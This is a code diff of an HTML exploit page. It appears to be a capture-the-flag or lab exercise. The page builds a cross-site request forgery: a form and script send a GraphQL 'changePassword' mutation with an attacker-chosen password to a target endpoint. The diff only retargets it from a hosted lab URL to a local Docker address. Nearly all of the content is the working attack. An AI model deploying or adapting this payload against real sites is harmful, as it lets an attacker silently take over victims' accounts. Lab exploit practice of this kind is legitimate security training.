@@ -2,12 +2,12 @@
 <html>
 
 <body>
-    <form id="formUno" action="https://web-express-auth-c83e74895658.c.mntcrl.it/graphql" method="POST"
+    <form id="formUno" action="http://172.17.0.1:4000/graphql" method="POST"
         enctype="application/x-www-form-urlencoded">
 </body>
 
 <script>
-    const targetUrl = "https://web-express-auth-c83e74895658.c.mntcrl.it/graphql?query=" + encodeURIComponent('mutation { changePassword(password: "sucasucasuca") }');
+    const targetUrl = "http://172.17.0.1:4000/graphql/graphql?query=" + encodeURIComponent('mutation { changePassword(password: "sucasucasuca") }');
     const form = document.getElementById('formUno');
     form.action = targetUrl;
     
